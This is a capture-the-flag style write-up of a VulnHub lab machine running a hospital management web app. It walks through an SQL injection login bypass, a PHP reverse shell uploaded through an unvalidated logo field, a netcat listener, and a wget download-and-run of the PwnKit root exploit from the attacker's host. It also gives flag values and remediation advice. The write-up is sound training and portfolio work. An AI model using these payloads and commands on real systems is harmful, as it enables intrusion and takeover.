# 🏥 HMS VulnHub — Penetration Test Writeup

> **Author:** [Primenexuss](https://github.com/PrimeNexuss) | **Org:** Nex-Experience  
> **Target:** Hospital Management System (HMS) — VulnHub Machine `nivek`  
> **Target IP:** `192.168.56.112` | **Attacker:** Kali Linux `192.168.56.1`  
> **Date:** March 14–15, 2026  
> **Difficulty:** Intermediate  
> **Result:** ✅ Root obtained — both flags captured

---

## 📋 Table of Contents

- [Overview](#overview)
- [Vulnerability Summary](#vulnerability-summary)
- [Attack Chain](#attack-chain)
- [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
- [Phase 2 — SQL Injection (Authentication Bypass)](#phase-2--sql-injection-authentication-bypass)
- [Phase 3 — Unrestricted File Upload & RCE](#phase-3--unrestricted-file-upload--rce)
- [Phase 4 — Anonymous FTP](#phase-4--anonymous-ftp)
- [Phase 5 — Privilege Escalation (PwnKit)](#phase-5--privilege-escalation-pwnkit)
- [Flags](#flags)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Tools Used](#tools-used)
- [Remediation Summary](#remediation-summary)
- [Disclaimer](#disclaimer)

---

## Overview

This writeup documents a full penetration test against the **Hospital Management System (HMS)** VulnHub machine. The engagement covered the complete attack lifecycle — from initial host discovery to root-level access — using only network-adjacent access with no prior credentials.

The box runs a PHP-based hospital management web application on Apache, alongside an FTP service, all hosted on Ubuntu Linux. Multiple high-impact vulnerabilities were identified and chained to achieve full system compromise.

---

## Vulnerability Summary

| # | Vulnerability | Severity | CVSS | MITRE |
|---|---------------|----------|------|-------|
| 1 | SQL Injection — Authentication Bypass | 🔴 Critical | 9.8 | T1190 |
| 2 | Unrestricted File Upload — RCE | 🔴 Critical | 9.8 | T1190 |
| 3 | Anonymous FTP Access | 🟠 High | 7.5 | T1133 |
| 4 | Privilege Escalation — PwnKit (CVE-2021-4034) | 🟠 High | 7.8 | T1068 |
| 5 | Plaintext Credential Transmission (No HTTPS) | 🟡 Medium | 6.5 | T1040 |
| 6 | Exposed Directory Listing (/uploadImage/) | 🟡 Medium | 5.3 | T1083 |

---

## Attack Chain

```
netdiscover → nmap
     ↓
Anonymous FTP (misconfiguration confirmed)
     ↓
Web app discovered on port 7080 (login.php)
     ↓
SQL Injection → Authentication bypass → Admin access
     ↓
Source code review → hidden setting.php discovered
     ↓
PHP reverse shell uploaded via file upload field
     ↓
shell.php triggered → Reverse shell as daemon
     ↓
SUID enumeration → /usr/bin/pkexec identified
     ↓
PwnKit (CVE-2021-4034) → ROOT
     ↓
local.txt + root.txt captured ✅
```

---

## Phase 1 — Reconnaissance

### Host Discovery

```bash
netdiscover -r 192.168.56.0/24
```

Target identified: `192.168.56.112` (MAC: `08:00:27:e9:01:dc`)

### Port Scan

```bash
sudo nmap -Pn -sV -sC -T5 -p- 192.168.56.112
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 — **Anonymous login allowed** |
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
| 7080/tcp | HTTP | Apache 2.4.48, PHP/7.3.29 — Title: Admin Panel |

---

## Phase 2 — SQL Injection (Authentication Bypass)

**Vulnerability:** CWE-89 | CVSS 9.8 | T1190

The login form at `http://192.168.56.112:7080/login.php` was intercepted using **Burp Suite Professional**. The POST body revealed:

```
user=admin&email=manuel7%40gmail.com&password=manuel7&btn_login=
```

**Payload injected into the `email` field:**

```sql
' OR 1=1 #
```

URL-encoded: `'+OR+1%3d1+%23`

Burp Suite Repeater confirmed a **200 OK** response with the Admin Panel dashboard — authentication fully bypassed without valid credentials.

**Screenshots:** `decoy_password_gmail.png` → `POST_request.png` → `Sqlinjection.png` → `login_successful.png`

---

## Phase 3 — Unrestricted File Upload & RCE

**Vulnerability:** CWE-434 | CVSS 9.8 | T1190 / T1059.004

### Step 1 — Discover Hidden Settings Page

Viewing the dashboard page source revealed a commented-out navigation entry pointing to `setting.php`.

### Step 2 — Discover Upload Directory

Browser DevTools on `setting.php` revealed the upload path: `/uploadImage/Logo/`

### Step 3 — Prepare Reverse Shell

```php
// shell.php — PHP reverse shell
$ip = '192.168.56.1';   // attacker IP
$port = 7878;            // listening port
```

### Step 4 — Upload & Trigger

- Uploaded `shell.php` via the Company Logo file upload field — **no file type validation enforced**
- Confirmed upload at `http://192.168.56.112:7080/uploadImage/Logo/shell.php`
- Started listener: `nc -nvlp 7878`
- Navigated to the shell URL to trigger execution

```bash
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.112] 49266
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

**Initial foothold obtained as `daemon`.**

---

## Phase 4 — Anonymous FTP

**Vulnerability:** CWE-287 | CVSS 7.5 | T1133

```bash
ftp 192.168.56.112
# Name: anonymous
# Password: (blank)
# Result: 230 Login successful
```

vsftpd 3.0.3 was configured with `anonymous_enable=YES`. The FTP directory was empty but the misconfiguration represents an information disclosure and potential upload risk.

---

## Phase 5 — Privilege Escalation (PwnKit)

**Vulnerability:** CVE-2021-4034 | CVSS 7.8 | T1068

### Step 1 — SUID Enumeration

```bash
find / -perm -u=s 2>/dev/null
```

`/usr/bin/pkexec` identified as SUID-root and vulnerable to CVE-2021-4034 (PwnKit).

### Step 2 — Deliver PwnKit Exploit

On attacker machine:
```bash
cd ~/Downloads/LinuxEnum
python3 -m http.server 8999
```

On target (daemon shell):
```bash
cd /tmp
wget http://192.168.56.1:8999/PwnKit
chmod +x PwnKit
./PwnKit
```

### Step 3 — Root Shell

```
root@nivek:/tmp#
```

**Full root access achieved.**

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User flag | `/home/nivek/local.txt` | `3bbf8c168408f1d5ff9dfd91fc00d0c1` |
| Root flag | `/root/root.txt` | `299c10117c1940f21b70a391ca125c5d` |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Description |
|--------|-----------|-----|-------------|
| Initial Access | Exploit Public-Facing Application | T1190 | SQL injection + file upload RCE |
| Execution | Unix Shell | T1059.004 | PHP reverse shell |
| Discovery | File & Directory Discovery | T1083 | Directory listing, SUID enumeration |
| Lateral Movement | External Remote Services | T1133 | Anonymous FTP |
| Credential Access | Network Sniffing | T1040 | Plaintext credentials over HTTP |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 | CVE-2021-4034 PwnKit |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `netdiscover` | ARP-based host discovery |
| `nmap 7.98` | Port scanning & service enumeration |
| `Burp Suite Professional v2026.1.2` | HTTP proxy, interception, Repeater |
| `netcat (nc)` | Reverse shell listener |
| `python3 -m http.server` | Exploit file delivery |
| `PwnKit` | CVE-2021-4034 local privilege escalation |
| `LinuxEnum / linpeas` | Post-exploitation enumeration |

---

## Remediation Summary

| Finding | Priority | Fix |
|---------|----------|-----|
| SQL Injection | 🔴 Immediate | Use parameterised queries; input validation; WAF |
| Unrestricted File Upload | 🔴 Immediate | Validate MIME type & magic bytes; store outside web root; disable script execution in upload dirs |
| Anonymous FTP | 🟠 High | Set `anonymous_enable=NO`; migrate to SFTP |
| PwnKit CVE-2021-4034 | 🟠 High | Patch polkit; `chmod 0755 /usr/bin/pkexec` as interim fix |
| No HTTPS | 🟡 Medium | Deploy TLS certificate; enforce HTTPS; add HSTS |
| Directory Listing | 🟡 Medium | `Options -Indexes` in Apache config |

---

## Disclaimer

> This penetration test was conducted in an authorised, isolated VirtualBox lab environment against a VulnHub virtual machine for **educational and portfolio purposes only**. No real systems were targeted. All findings are documented to demonstrate technical skills and support responsible security research.
>
> **Author:** Primenexuss | **Organisation:** Nex-Experience  
> **GitHub:** [github.com/PrimeNexuss](https://github.com/PrimeNexuss)
